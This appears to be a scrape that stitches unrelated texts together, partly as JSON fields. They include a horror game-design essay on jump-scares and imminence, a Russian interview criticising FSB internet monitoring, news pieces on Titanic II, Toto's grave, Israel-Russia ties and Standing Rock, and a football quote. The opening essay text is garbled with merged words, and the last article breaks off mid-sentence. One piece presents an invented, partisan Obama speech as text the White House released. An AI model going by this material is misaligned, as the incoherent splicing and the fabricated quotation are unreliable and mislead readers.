In which case, while theis seemingly natural in aspect and keeps things clear, something trying to disguise it's ownis a product of its behavior as opposed to it's nature and can be looked at as eitheror, all depending on how the player perceives it.Trueinformation is not supposed to make sense. In fact, it makes too much sense for things that cannot be.

A ghostly appearance can have many different Fictional explanations, from actual ghosts, to visions, to hallucinations and so on, but Virtually they're the same thing. First the players sees something or someone spatially positioned play area, which's sufficient information to conclude it's there (), then latter comes the realization it'sactually there, or has never been, and the previous information is proven wrong ().Coming from the \"plot twist\" connections of the tool, it's one that works better the first few times it's pulled, before it becomes a \"known absence\" or \"known false presence\" for the informee, which can make it either fail as a form of uncanny presence, but also gives the design a new opening to subvert the current status of information back by making the \"false\" appearances be real the next time around, reestablishing theExample ofas ghostly appearance in Video-Games:\n\nThe \"ones we don't mention\" exist. Then they don't really exist. Then they actually show up on the screen. But the character that \"sees\" them is blind, so maybe they're only in her imagination. Or maybe it's not just in her mind and it is actually there... is it? This is a tricky example to truly replicate in the Virtual world, as you can dictate a Fictional-Character's mind, but not a Real-Player's one.\n\nIsaac's mind is disturbed and he keeps seeing his dead girlfriend. At all times, the Real player is aware of it, but for Fictional Isaac the hallucinations are very real the moment they happen. Some times, there's a Virtual aspect to it, when the girlfriend's actions is in fact Isaac's, another Fictional character or a Virtual enemy, in which case a Quick-Time Event tells the player what's happening.\n\nClearly the great goal and the most interesting challenge is to perfectly blend the Fictional and Virtual world, making everything that \"happens\" to do so in both, and feel as Real as possible to the player. But when design is somehow constrained out of that option (for whatever reason it might be), the Fictional uncanny presence stills adds to the experience, and should still be employed given the opportunity.\n\nSome times, simple but clever tactics can be employed to achieve the effect of blending worlds, without going to extremes. Making what happens in the Fictional character's mind to exist as real in the Virtual world is a way of doing that. Other options are to use the software to read' the player's reactions to appearances and judge if he treats them as real or not, and go for the opposite in order to subvert his expectations.\n\nExample of Fictional and Virtual uncanny presence brought together by clever design:\n\nIn Dead Space 3, co-op player's are transported to different versions of the Virtual reality, by hallucinations fueled by each Fictional character's own internal demons, and each Real player sees a different situation developing in their screen, while still faced with real Virtual conflicts.\n\nClearly the great goal and the most interesting challenge is to perfectly blend the Fictional and Virtual world, making everything that \"happens\" to do so in both, and feel as Real as possible to the player.

More than just the consequences of a risky action, but the unforeseen and unexpected event that's out of one's control or when you know something will happen, just don't know when and you cannot impede it.\n\nFollowing the norm of analyzing the most common forms first, we can observe that usually in Horror Video-Games, what the players don't know in this case is the moment something will jump out or make a loud noise with the purpose of startling them. The \"jump-scare\". There are other forms of jump-scare usage that don't necessarily involve something jumping at the player (floors collapsing bellow the avatar are another common appearance) but the forms of holding and releasing information are the same.\n\nThe use of this tool is most common in Horror Video-Game segments that strive for startling the (Real) player. This is done by submitting the player to a core loop of anticipation, surprise and relief, of which the first one (anticipation) usually compromises most of the play time, followed in time by the third one (relief), while the second one (surprise) starts and ends very quickly.\n\nSometimes when this tool is used it does so while wasting the potential of an otherwise powerful moment of reveal, spending it into a mere jump-scare when the information being revealed could have had a greater shock and more lasting impact if not obfuscated by the quick-come-quick-go startling effect. There's a physiological limit to how much emotional response the human body can sustain at any time, it's not like our blood could be completely diluted by Corticotropin (we'd literally die of fear way before that), and there's also a psychological limit of how much each layer of consciousness can focus at any given time and more urgent matters will overshadow more delicate ones. The Real adrenalin pump of a jump-scare is immediate, and can easily take away the precious attention a shocking Fictional moment might require from the player to understand the depths of the horrors he's in contact with.\n\nThis is a tool that's very easy to make use of, and that's effective for what it proposes to accomplish, but that quickly falls into the traps of losing all it's positive effects when combined with the Genre Savvy Player-Mechanics. The biggest downside of the jump-scare design tool is that the Dynamics that arise from those Mechanics can fall into the meta-game category, or in other words, into a Real-world game detached from the Virtual and Fictional worlds.\n\nOnce the player is focused on a loop of Unknown Imminence (anticipation, surprise and relief), it leads to him/her to fear the possibility not being prepared for it when it happens. Exactly what happens or what jumps out of where isn't really important to the player. It's all about being or not being prepared for when it happens. The player then engages – consciously or not – in a self-imposed Meta-Game of either: a) trying not to be caught by surprise by the game; or b) overplaying his surprise with jumps and screams.\n\nThe player starts to \"fear\" (anticipate) being startled by the Video-Game (Real piece of Software) instead of being scared in the Video-Game (Virtual and Fictional world). By the point the player is meta-gaming, he's not in the Fictional and Virtual slices of the Video-Game's world anymore. That's an important distinction to make, and it's equally important to define what the design is aiming for. Both are valid design goals, what matters is if the design achieves what it's actually trying to.\n\nWhile jump-scare design can raise your heartbeat and pump adrenaline in your system, it's not exactly the same as Fear, and not the same as fear inside the Virtual and Fictional world, but instead of Apprehension in the Real world about the Video-Game as an entertainment product and disconnected from the Virtual and Fictional world inside the Video-Game. Apprehension can become Paranoia but it's also not exactly the same as Fear – unless, or course, you have Hormephobia, then that's a different story.\n\nI want to point out the fact that it seems very clearly to me, that horror movies seem to have a lot more acceptance from usage of jump-scares than Video-Games do: jump-scares in movies are \"cool\" and \"scary\" while in Video-Games they're boring, lame, lazy and cheap. I guess that tells a bit about the difference in audiences and audience expectations, which in my opinion is good that Video-Game audiences put the bar higher and don't accept lazy design. I won't dive much into that, just leave it here for consideration, but also add to the note that horror novels and other written stories don't have that card in their repertoire, and their strength lies in other, more immersive and elaborate tools.\n\nBut not everything about surprise and jump-scares is flawed. They work as, though very short-term, fear catalysts because the human mind allows it. Humans, in general, worry too much about things that will never happen, and about things that already happened; some do so to a degree bigger than others.\n\nOnce you get surprised and see what just \"jumped\" at you, the shift from unknown to known is too fast and brings too much information at once. This is what we call a shock. Despite the very visceral and immediate carried information about intention that it's something attacking you – which initially works regardless if it's correct or incorrect information, but that we as a fit species also adapt to and quickly learn if it's just trying to scare us instead –, it also carries the revelation that we did not have sufficient information about it coming to happen prior to the moment.\n\nThis causes the fear of unknown future (Paranoia) to now be boosted with fear of unknown past. Yes \"fear of the past\" and \"unknown past\" are both illogical sentences, but that's because \"worrying about the past\" is also illogical yet humans do so. Neurotransmitters simply defy logic, and exploiting these openings remains an effective strategy of Game Design until the audience adapts and develops immunity to such strategy.\n\nSometimes, the fear of unknown past can come alone. That's when a jump-scare is not preceded by Paranoia (the future version) which means that the player is not expecting it. It can be good or bad depending on the player. The potential to break immersion and pull the player into the meta-game is the same or greater, it'll depend on how self-aware the moment will be for player. If the the player thinks \"the 'Game scared me\", or \"the 'Game got me\" (even worse, this means the meta-game is already going on), it's a failure; if the player thinks about the moment within the Video-Game's world, it's a success. That is, unless it's the design goal anyway.\n\nBeing scared by a Video-Game and being scared by the world of a Video-Game are very different things, the former only involves the Real dimension of the Player, the latter encompasses the entire Player-Character construct in the Real, Virtual and Fictional dimensions.\n\nIt's important to note that not every shock classifies as a jump-scare. But the usage of cliché jump-scare sound effects and similar tricks can bridge the gap and degrade a shocking moment into a jump-scare even if it doesn't classify at first. It's like screaming, swearing or pulling the troll or nazi cards in a discussion: even if you might be initially right, you're acting like people that are wrong do (i.e. being emotional), therefore you're wrong regardless. Over-playing a shocking revealing moment into a mere jump-scare throws lost of good work and potential down the drain can be a huge waste.\n\nScared players.\n\nWhile it's true that some players like to pretend to be surprised, immersed and scared by anything and some just blame the consumer instead of the designer for when it doesn't work, I prefer to think it's always our fault when it fails. Making Video-Games is a hard game, and that's a good thing: it wouldn't be fun if it wasn't challenging.\n\nUse at your own discretion.\n\nVague Imminence\n\nAs with all the vague packagings looked at so far, the vague imminence is the event in which the informee is teased with a possibility of something happening and an approximation of the idea about how close it's getting. It's still not known, but not certain either.\n\nContrary to the unknown imminence, this is not the kind of suspense where you cannot see it coming (even though in practice the opposite is most times true, because clichés and patterns are predictable in nature) and, more importantly, what's coming. That's the key point that differentiates the vague imminence and the unknown imminence: you know what is about to happen, but not sure if it will, and what precise moment.\n\nThis tool is very commonly used in Fiction media, specially effective in film with it's visual and cut language, and the characteristic of Fiction of being able to give the audience information that the characters – or the enemies – lack.\n\nExample of Fictional vague imminence:\n\nIn the classical shower scene of Psycho (1960), the audience (Real) has information the character (Fictional) doesn't. The approaching moment fuels the audience's fear of the imminent events.\n\nIn the also famous kitchen scene in Jurassic Park (1993), this time the audience has information the antagonist deinonychus lack. At any moment now, the ferocious hunters could spot the kids.\n\nClearly signature of Spielberg's style, the vague imminence is present in many of his films.\n\nThe uncertainty of the outcome combined with the acknowledgement of what the result of such suspense, and how close (imminent) it is to be fulfilled, is the source of the audience's fear.\n\nThe difference in tangibility of the imminent danger created with the vague information contrasts with the effect of paranoia created by the unknown counterpart. The context created by the source of danger helps pulling the audience into the Fictional world (as long as plot armor doesn't go to far to build disbelief), avoiding the effects of meta-scariness characteristic of the jump-scare tool employed by the unknown imminence.\n\nBy this point you must all have already notice the trend of stealth-action situations directly tied to most of what the tool is about. This is a truly powerful combination, specially when it gets across the line where Fiction ends and Virtuality starts. The stream of adrenalin caused by the act of sneaking around is a strong, Real addition to Fictional Aesthetics of the horror atmosphere and the Virtual danger of getting caught by the enemies in the Video-Game's world. What results from the combination of all those factors is a thrilling experiential product only Reality can surpass.\n\nExample of Virtual vague imminence:\n\nEven with full top-down view and super powers, the unpredictability (unknown imminence) of randomized patrol paths, added to the knowledge about how close it is to happen, make this game a very thrilling stealth-action experience.\n\nUncanny Imminence\n\nAcross the analog path that goes from unknown to known lays the vague, many variations of it, and there's a form of Suspense that works exactly by moving along that path, from the unknown and towards the known. At some point it gets so close to known that it becomes uncanny in nature.\n\nI like to call it \"bold suspense\", because it's a very confident tool of horror design. When the subject of horror is a tangible thing, it uses known or uncanny image and presence throwing away many tools and leverages given by the most powerful assets of unknown horror design and goes all out on the confidence that the subject is all that frightening in and of itself once the tricks are all dropped. It's also a staple of the climax pacing event, which eventually all horror and mystery lead to.\n\nThat form of suspense is what we could call \"dramatic pause\". First, it doesn't have to be a literal interpretation of a binary pause, but rather a form of delaying the outcome of the horrific situation. There are multiple small variations of how to pull it, like the \"waiting horror\" that stands on there, which deals with uncanny intention (and other natures of uncanny packaging) to delay the threat's move, and the \"slow moving horror\", which slowly get's closer and closer to the victim character/agent.\n\nThe \"waiting horror\" has a direct link to our primal survival instincts (Player-Mechanics), by mimicking the behavior of wild predators, in the preparation for a deadly lunge and in the creepy act of stalking a prey. It also increases the sense of danger to have a pragmatic predator opposed to a mindless one.\n\nPacks of wolves and hyenas derive many of it's efficiency at survival by minimizing their own risks, making them able to catch preys stronger than themselves, otherwise impossible at a direct confrontation. Like wolves and other canines, vultures also calmly follow their preys for days, beating them in an endurance contest, patiently waiting for them to extinguish their energies in other to maximize the effectiveness of the attack, only committing when the success is guaranteed.\n\nSimilarly, the \"slow moving horror\" hints our instincts (Player-Mechanics) into the dreadful acknowledgement that the predator has it all under control, while also capitalizing in the \"ticking clock\" embedded Mechanic and the Dynamics it creates.\n\nThat's another example of the importance of keeping Player-Mechanics (which happen in the Real world) in mind when design horror.\n\nAbility to strategize and confidence to act calmly make any predator a much more deadly encounter, and this is something we know at an unconscious (and irrational) level. If the rest of the experience does it's best to remain immersive.\n\nI won't get deep into this subject here but, in my humble opinion, \"immersion\" is what happens when your mind is too busy playing the game / reading the book / watching the movie to remember it's one. Different people in different moods have different amounts of parallel mind processing capacity. As long as an experience can exceed that capacity and nothing too wrong and obvious forces it's way into the priorities, all the Real-world thoughts will be filtered out of the most conscious layers of the mind, and that's how immersion is sustained.\n\nDon't let your players have spare resources laying around so that they can be used to see things you don't want to be seen, and don't let said things climb the priority queue. Keep your players too busy in the Virtual and Fictional worlds to afford thinking about the Real one, and they won't. How much is \"busy enough\" varies from player to player, some are so used to the most basic things that they become second nature. Some can be engaged enough (sometimes even overwhelmed by) just holding forward and looking around, while others can be rocket-jumping through the stage and not even think about it while they do so.\n\nExamples of uncanny imminence:\n\nCreepy bastard. It's true that slow enemies are a compromise of balance design in horror games of early generations due to the limitations control schemes, but with them came many positive side effects lost in today's games due to advancements in technology (as mentioned in the vague image section of the Part 2 of this series). But the thing is, we don't necessarily have to lose those tools, just try to understand them and find ways to make them work in today's and future's context.",

I have seen a real marked difference in terms of his performance.\n\n“I’ve been pleased with his response. He has made it very clear he loves it here – despite one or two stories I’ve heard.\n\n“I know the player and he wants to show he can help the team.

Но остальные будут использовать шифрование поверх шифрования, шифрование шифрования в шифровании или стенографию — это возможность скрывать данные в изображении: например, в каждый третий пиксель я буду вшивать какой-то байт информации и каждый день менять алгоритм. Как меня вычислят? Предлагаемая ФСБ система будет работать на поимку идиотов, но враг зачастую умнее нас, у него больше денег, и он не скован никакими законами.\n\nЕсли все организуют так, как говорят в новостях, меня это пугает, потому что получится как обычно: терроризм мы не победим, но закупим много очень дорогостоящего оборудования и усложним доступ к интернету пользователям. Китай известен своими решениями в области блокировки и контроля над интернетом. Но я встречался с китайскими студентами — все пользуются чем хотят, используя разные обходные пути, без опасности быть пойманными. Так что если кто-то захотел бы стать террористом — никаких проблем.\n\nТеневой интернет появился после того, как стали блокировать сайты. До этого найти наркоторговцев было нетрудно. Преступники делали ряд определенных ошибок, благодаря чему их выслеживали. Но государство сказало на всю страну: мы будем бороться с наркотиками в интернете, мы будем блокировать сайты — и наркотиков станет меньше. Но наркотиков не стало меньше, появилась целая индустрия их доставки в теневом интернете — таких преступников ловить в сто раз сложнее, и «сто раз» — это я не преувеличил.\n\nВ ФСБ пытаются решить человеческие проблемы техническим путем. Любое преступление делают люди, так что работу нужно вести с людьми. В царские времена не было телефонов, была хорошая агентурная сеть. А мы привыкли сидеть на заднице в надежде, что террористы совсем тупые и что они будут по открытому трафику сообщать о террористических акциях.\n\nЕсли вы хотите с кем-то бороться, зачем говорить об этом врагу? Есть классическое тысячелетнее правило: хочешь на кого-то напасть — не говори ему об этом. Германия перед началом войны с Советским Союзом не говорила: мы сейчас примем один закон, а 22 июня вы будьте готовы, потому что мы на вас нападем. Как американцы борются с терроризмом? Они никому ничего не говорят. Стоит поучиться, ведь для террористов работа спецслужб будет сюрпризом. Может, есть какой-то хитрый план, о котором нам не говорят, возможно, нас от него отвлекают — я бы хотел в это верить. Но ситуация с теневым интернетом, когда блокировки сайтов привели к колоссально большому интересу пользователей к технологиям TOR, использованию VPN, анонимному доступу в интернет, шифрованию трафика, — эта ситуация показывает, что плана у спецслужб, похоже, нет. Сейчас любой непорядочный человек может за 24 часа через теневой интернет заказать любое хулиганство — например, поджог машины в какой угодно точке России.\n\nВ современной рыночной экономике нельзя родить технологию искусственно. Нельзя вдруг взять и сделать крутой отечественный автомобиль или российскую операционную систему, которая будет работать лучше остальных. Технология должна родиться естественным путем: Windows успешна, потому что не делалась под заказ государства — просто у рынка была потребность в хорошей операционной системе. Мы же хотим создать нечто искусственное, что решит все проблемы. Мы делаем колоссально тяжеловесную искусственную систему, которая будет ловить некоторых неосторожных дураков. Уже при анонсировании «закона Яровой» все знали, как обходить предполагаемые им блокировки. Поэтому я искренне хочу верить, что все не так, а на самом деле мы делаем систему как в Израиле или США. Вот заблокировали PornHub в России — упал ли у него трафик? Он вырос. Люди, которые не знали о нем и искали порно в «Яндексе», поняли, что вот есть место, где можно посмотреть порнографию бесплатно. А обойти блокировку элементарно просто.",
  "latent_1808": "The White House on Monday released the text of President Barack Obama's highly controversial speech to the nation's school children Tuesday. As expected and feared by those on the right, the speech, I'm embarrassed to say, is truly shamefully partisan and full of dangerous radical views. Here it is:\n\n\"Hello children, both Democrats and those whose parents belong to that less desirable party. Today is a very big day for you. Your first day back to school. I hope you enjoyed your Summer vacation. I tried to enjoy mine, but certain members of an un-named right-wing political party have made the past two months a living hell for me. But this isn't about me, so let's discuss why I've decided to talk with you today.\n\nEducation. It's the backbone and foundation of our society. It's what makes America great. And you as young school children represent America's future. It's important that you study hard, set goals and expand your horizons...and most importantly, that you desperately try to convince your Republican parents that they are 100% wrong about every domestic issue from taxes to health care reform to abortion, gun control and gay marriage. But I digress...\n\nEach and every one of you has the same ability to succeed in life no matter what obstacles you face. If your family is poor, you can still go to college ... unless of course the Republican Party, should it ever return to power, completely guts Pell Grants, student loans and other tuition-assistance programs.\n\nYes, you are our future. We need your collective brainpower. We need you to find a cure for AIDS and cancer. We need you to protect the environment by helping to develop alternative energy sources, green jobs and other environmental protections ... because the Republican Party refuses to accept that global warming exists, and only cares about protecting oil companies and corporate polluters.\n\nAnd since you asked, let's talk health care reform. Many of your parents would like you to believe that my \"public option\" package would kill your grannies. You march right into your living rooms tonight and tell your parents they're full of shit! Just like that. And tell 'em Uncle Barack said so. Trust me kids, if anyone's lying here, it's mommy and daddy. And another thing, if there's a political party that cares about the old, the poor, the sick, the hungry, veterans and puppies, it ain't the Republicans. Republicans wanna kill puppies!\n\nNow the last thing I'd like to discuss with you is the need for you to get involved. Care about your community, your city, your state, your country. Even me, your president. Ask how you can help. How you can support what I'm trying to do to fix the economy, end our two wars and get America back to being the greatest nation in the world. But I can't do it alone. I need you to join the Young Democrats Club. Visit our website. Go to meetings. Wear our uniform. Learn our secret handshake. We're the fun party! And we're smart, too. C'mon, we both know that any party who sees Sarah Palin as their future, well, that's pretty dang scary, right?\n\nSo go home, tell mommy and daddy that we had a simple little chat today, and that everything's ok. Then help me in this revolution! Watch your email for further information.\n\nGood day kids, and God bless (I say \"God\" with a wink because, as everyone knows, I'm a God-less communist/socialist/fascist/Muslim terrorist who hates Jesus and America).",

The story has since captivated the world, helped along by a little film adaptation in 1997 starring Leonardo DiCaprio and Kate Winslet.\n\nAmong those who remain fascinated by the tale is Australian billionaire Clive Palmer, who is building a replica of the ill-fated ship called Titanic II. It was recently announced that the ship will set sail in 2018, two years later than planned.\n\nBlue Star Line’s recreation will look just like the original liner, but will be four meters wider to meet 21st century maritime safety regulations, and will feature a hull that is welded instead of riveted. It will also meet modern safety regulations, including equipment like life jackets, a certain quota of lifeboats, and of course, updated technology.\n\n\"The new Titanic will of course have modern evacuation procedures, satellite controls, digital navigation and radar systems and all those things you'd expect on a 21st century ship,\" James McDonald, the global marketing director of Palmer's Blue Star Line, told the Belfast Telegraph.\n\nThe ship will be 270 meters long, 53 meters high, and weigh 40,000 tons. It will contain nine floors, with 840 cabins to accommodate 2400 passengers and 900 crew members. Travelers can visit Turkish baths, a swimming pool, gyms, and spaces modeled after the original restaurants and dining rooms. The replica will also stay loyal to history with its ticket classifications: first-, second-, and third-class tickets will be offered.\n\nTitanic II will, however, differ from history in its route, traveling from Jiangsu, China, to Dubai in the United Arab Emirates, where Blue Star Line has reportedly been fostering business partnerships.\n\nIf the idea of the replica rubs you the wrong way, you’re not alone. Relatives of some of the Titanic’s lost passengers have spoken out against the project. On the flip side, Blue Star Line has reportedly received a bevy of inquiries from interested parties, and offers as high as £640,000 (about $925,600) for a ticket.

  "latent_2103": "FixNation is Deeded the Plot to Toto’s Final Resting Place in Hollywood Forever Cemetery\n\nToto from The Wizard of Oz is one of the most well-known and beloved canine movie stars of all time. Say the word Toto to almost anyone in the world and they immediately know who you are talking about.\n\nAs a film, The Wizard of Oz was epic when it was released back in 1939. It was witness to the launch of Technicolor, it won several Academy Awards, and to this day it’s one of the biggest films in pop culture history. At least once a year, the movie airs and both young and old sit rapt in front of the TV. If you grew up with the Wizard of Oz, you remember being fascinated by talking lions and tin men, getting scared silly by flying monkeys and wicked witches, and falling in love with the adorable little Toto. And some of us drooling over Dorothy’s red glitter shoes, but that’s for another web post.\n\nWhat most people don’t realize is that since Toto’s death in the late 1950’s, Toto has gone completely unrecognized by the Hollywood community. There is no star on the Hollywood Walk of Fame, no memorial statues…absolutely nothing to honor this little dog’s big acting career.\n\nBut that is soon about to change!\n\nCLOSE-UP: Toto\n\nToto was one of the many animals trained by Carl Spitz back in the golden years of Hollywood. Carl Spitz was a German immigrant who became a famous animal trainer for the studios, opening up his Hollywood Dog Training School back in 1927. Spitz pioneered the training technique of using hand signals to get animals to perform. Toto was actually played by a female Cairn terrier named Terry, who had been abandoned at Spitz’s kennel four years before The Wizard of Oz was made (yes, Toto was a rescue!). Spitz officially changed the dog’s name to Toto after the movie became so popular. Toto went on to co-star in many films with some of the era’s biggest actors.\n\nWhen Toto died towards the end of WWII, Carl Spitz buried the little dog behind his house and kennels. Then in 1958, the Ventura Freeway was expanded across the San Fernando Valley. CalTrans bought up the Spitz property for construction purposes and the entire area was destroyed. Toto’s final resting place had been plowed over in the name of progress.\n\nFast Forward to 2010\n\nJ.P. Myers, an L.A. local, was talking to a co-worker about an episode of the Huell Howser show, where Howser interviewed author and grave hunter Steve Goldstein about the lives and grave sites of famous animals. Through that conversation, Myers realized that Toto had lived and died just blocks down the street from where he had gone to elementary school on Riverside Drive, and this really hit home. Myers had just successfully launched a Facebook fan page and campaign to get Jack Norworth, who penned “Take Me Out to the Ballgame,” a more appropriate grave marker than the nondescript gravesite where he had been buried. It dawned on him that the same action was needed for Toto, so Myers picked up a copy of Steve Goldstein’s book, LA’s Graveside Companion: Where the V.I.P.s R.I.P., to dig up more information. He contacted Goldstein directly, and Goldstein agreed to partner up on the project.\n\nHollywood Forever to the Rescue\n\nGoldstein and Myers reached out to a number of local cemeteries around Los Angeles, only to get turned down by every single one. Finally, they contacted Tyler Cassity, owner of Hollywood Forever Cemetery. Hollywood Forever is the final resting place for hundreds of big-name celebrities such as Rudolph Valentino, Douglas Fairbanks, Hattie McDaniel and Johnny Ramone, to name a few. Cassity, an animal lover, immediately recognized the impact that Toto had on American culture and graciously offered to donate the VIP plot and the memorial marker for Toto. It was agreed that the plot should be deeded to an animal group so that Toto’s gravesite would always be protected and well cared for. Cassity suggested FixNation, and Myers and Goldstein quickly agreed. FixNation has been fixing the feral cats at Hollywood Forever for some time now, in coordination with the cemetery and its caretakers.\n\nA dedication ceremony will be held on Saturday, June 18th at 11:00 a.m. at Hollywood Forever Cemetery to unveil the new grave site and marker. The ceremony will be open to the public, so please come out and join! All parties will come together to celebrate and give tribute to this little dog’s big achievements. Thanks to the heart and vision of Myers, Goldstein, Cassity and Hollywood Forever, little Toto will be honored with the recognition this little legend so worthily deserves.\n\nFor Toto, finally, there’s no place like home.\n\nToto’s dedication ceremony will be held on Saturday, June 18th from 11:00 a.m. – 1:00 p.m. at Hollywood Forever Cemetery. Admission is free to the public and there is free parking on site inside the cemetery. Kids and pets are both welcome. Hollywood Forever Cemetery is located at 6000 Santa Monica Blvd., L.A., 90038.\n\nJoin the Toto Memorial Marker Facebook page\n\nRead LA Weekly coverage",
  "latent_2361": "Dear Reader, As you can imagine, more people are reading The Jerusalem Post than ever before. Nevertheless, traditional business models are no longer sustainable and high-quality publications, like ours, are being forced to look for new ways to keep going. Unlike many other news organizations, we have not put up a paywall. We want to keep our journalism open and accessible and be able to keep providing you with news and analysis from the frontlines of Israel, the Middle East and the Jewish World.\n\nLove him or hate him, Russian President Vladimir Putin's military intervention in Syria unquestionably upended Middle Eastern politics. Putin supported Syrian President Bashar Assad, established several military bases in Syria, created a de-facto Russian-Shi'ite axis, confronted Turkey and forced the West to re-engage with him.\n\nWhile all the region's major players feel the influence of Russia's military campaign, one country overlooked by commentators analyzing Russia's Syrian campaign is Israel. Israel's interests vis-à-vis Russia run wide and deep and are impossible for Jerusalem to ignore.\n\nThe history of the Israeli-Russian relationship is complicated, to say the least. The Soviet Union supported the creation of Israel in 1948, but then tilted towards the Arab world in the early 1960s and even threatened to attack Israel in both the 1967 Six Day War and 1973 Yom Kippur War.With the emergence of Putin, though, Israel found the closest thing to a friend it's ever had in Moscow. Israel and Russia share a common fear of terrorism, and in 2014 Putin was one of the few world leaders to support Israel's Operation Protective Edge against Hamas, saying \"I support Israel's battle that is intended to keep its citizens protected.\" In 2005, Putin became the first Russian president to ever visit Israel, visiting the Western Wall - Judaism's holiest site - as well as Israel's Yad Vashem Holocaust memorial, where Putin observed a moment of silence. The Russian president even reportedly purchased an apartment in Tel Aviv for his then-84-year-old Jewish German teacher. Putin returned to Israel in 2012 as the guest of honor at a state dinner and to inaugurate a monument to the Red Army soldiers who defeated Hitler in World War Two.Despite these positive feelings, Russian national interests remain Putin's priority, and as Russia modernizes its military and steps to the fore in the Middle East, Moscow possesses significant capabilities to either help or hinder key Israeli interests.First, although Israel remains determined to avoid entangling itself in Syria's intractable war, there is one \"red line\" Jerusalem remains determined to enforce: it will not allow the transfer of advanced weapons from Iran or Syria to archenemy Hezbollah. The Israeli Air Force has not hesitated to enforce this policy, striking weapons convoys in Syria destined for Hezbollah numerous times since the start of the Syrian war.As a result, Russia's deployment of advanced surface-to-air S-400 missiles is of grave concern to Israel. With a radius of 250 miles and the ability to target up to 36 aircraft simultaneously, the S-400 is a potential game changer. One senior Israeli officer went so far as to describe it as a potential \"nightmare.\" In the event of a serious deterioration in the Israeli-Russian relationship, the S-400 could greatly complicate the Israeli Air Force's ability to strike weapons shipments en route to Hezbollah through Syria. Israel therefore needs assurances from Russia that the S-400s will not impinge the freedom of movement Israeli jets possess over Syrian airspace.As a result of these concerns - as well as the general desire to avoid accidental clashes with the Russian military - Prime Minister Benjamin Netanyahu visited Moscow to meet Putin as soon as the depth of Russia's military commitment to Syria became clear. After this meeting - as well as a subsequent conversation with Putin in Paris on the sidelines of the Climate Conference - Netanyahu believed Putin respected Israel's Hezbollah red line.Six weeks later, though, the picture appears murkier. According to a recent report, Russia is transferring weapons directly to Hezbollah, since Moscow views Hezbollah as a more effective fighting force than the Syrian army. If the report is accurate - and it's not yet clear it is - two questions emerge: Is Russia transferring the same types of weapons to Hezbollah that Hezbollah has already acquired from Iran, or are they more advanced? And would Russia permit Hezbollah to use these weapons against Israel as well as the Syrian rebels? Either way, Netanyahu must remain on good terms with Putin to ensure Moscow takes Israeli concerns about Hezbollah into account going forward.The Israelis also fret about Russia's supply of weaponry to Iran. After initially signing a deal with Iran in 2007 to supply S-300 anti-aircraft missiles, Russia turned around and canceled the deal - under pressure from the West, and at least partly out of respect for Israel's security concerns. After heeding Israeli concerns for nearly a decade though, after the conclusion of the recent P5+1's nuclear agreement with Iran, Russia announced its intention to finally deliver the S-300s it had promised.A former head of Israel's missile defense program noted that \"there will be a dramatic change in [Iran's] capability, and it does not create a reasonable environment for any operation of our air force.\" Israel now seeks to use its positive relationship with Putin to limit further spillover effects from Moscow's decision, in particular to ensure that Iran's S-300s never reach Hezbollah.Finally, Israel's third major interest vis-à-vis the Kremlin is the approximately 200,000 Jews remaining in Russia. Indeed, Putin's positive feelings towards Israel are echoed by what some describe as Putin's philosemitism, or affinity for the Jewish faith. Domestically, Putin counts numerous Jewish businessmen and officials as friends, and acknowledges the positive influence of Jews on him during his childhood. Putin also supported the founding of the Jewish Museum and Tolerance Center in Moscow, even donating his own money; stated his \"fierce opposition to any manifestation of anti-Semitism and xenophobia\"; ensured the return of many synagogues to Russian Jews previously seized by the Soviets and just initiated a law against anti-Semitic Biblical commentary.Despite Putin's positive disposition towards Russian Jews, given the history of anti-Semitism in Russia, Israeli leaders surely understand that a serious deterioration in the Moscow-Jerusalem relationship could hurt the status of the country's relatively small Jewish population. This offers Israel yet another reason to maintain good relations with the Kremlin.Israeli foreign policy related to the Ukraine crisis reflects Jerusalem's desire to avoid alienating Putin. After Russia annexed Crimea, Israel abstained from voting on a United Nations resolution condemning Russian actions - which in UN-speak is actually equivalent to voting against it. Afterwards, Israeli Foreign Minister Avigdor Lieberman issued the blandest of statements, saying that \"our basic position is that we hope Russia and Ukraine will find a way as quickly as possible to normalize relations, and find a way to talks, and to solve all the problems peacefully.\"The US State Department issued a statement noting it was \"surprised Israel did not join the vast majority of countries that vowed to support Ukraine's territorial integrity in the UN.\" Despite American criticism, shortly thereafter Israel also agreed on the installation of a special encrypted communications line between Netanyahu's and Putin's offices. Given the United States' strong opposition to Putin's move on Crimea, Israel's willingness to defy its closest ally indicates the extent to which Israeli leaders seek to maintain a good relationship with Putin.With the Russian Bear now firmly ensconced on its northern border, expect Israel's leaders to continue paying close attention to the man in the Kremlin.Josh Cohen is a former USAID project officer involved in managing economic reform projects in the former Soviet Union.

But it is spreading quickly; the number of check-ins at the Standing Rock reservation page went from 140,000 to more than 870,000 by Monday afternoon.\n\nThe pipeline’s proposed route, to transport fracked crude oil from the Bakken oilfield in North Dakota to a refinery near Chicago, would cross the Missouri river just upstream of the reservation.\n\nThousands have set up camp on land abutting the reservation, and hundreds have been arrested in numerous clashes with police. Protesters say they are ready for a “last stand” as the pipeline’s construction advances.\n\nA spokesperson for the Morton County sheriff’s department told the Guardian in a statement that it was “not monitoring Facebook check-ins for the protest camp or any location for that matter. These rumors/claims are completely false.”\n\nLindsey Jones, from Wethersfield, Connecticut, was one of the million who remotely checked in on Facebook at the protest camp on Monday. She said that she was skeptical of the capability of checking-in on Facebook to disrupt police activity but added that, in general, “I guess it’s a nice gesture to show solidarity.”\n\n“It’s definitely better than just sticking your head in the sand. And it does often lead to ‘real’ activism when people who don’t know anything about organizing or activism connect with people who do,” Jones said.\n\nKandi Mossett, a 37-year-old Native American activist who has been at the Standing Rock protest since August, said she was more concerned about ground surveillance than Facebook monitoring.\n\n“I think they’re listening to us right now as we speak,” she said. “My concern is the invasion of privacy … It’s eerie and frankly quite irritating.”\n\nMossett, of the Mandan, Hidatsa and Arikara nation, said she thought the police could easily detect whether Facebook users were falsely checking in from other locations because of geotagging tools, but added that it was still nice to see so many mentions of Standing Rock on social media. “It gives people a way to support us.”\n\nMarty Aranaydo, a member of the Muscogee tribe currently stationed at one of the camps, admitted he was initially confused when he thought random acquaintances from college had shown up in person.\n\nDakota Access pipeline protesters see bias after Oregon militia verdict Read more\n\n“People want to be here, but sometimes life doesn’t allow it,” he added. “I take this as a visible way people can show solidarity. I don’t know if the strategy will work.”\n\nAranaydo pointed out that the direct monitoring – including the low-flying helicopters that frequently hover above the camps, sometimes shining bright spotlights in the middle of the night – was much more upsetting to him and other protesters.\n\n“Their monitoring gives them a way to mess with us. They know it gets to us and can make things worse.”\n\nWiyaka Eagleman, a member of the Sicangu Lakota from Rosebud, South Dakota, who has been at the protest camp since it began in April, described the check-ins as “a form of support”, but added: “It would be nice to have those 550,000 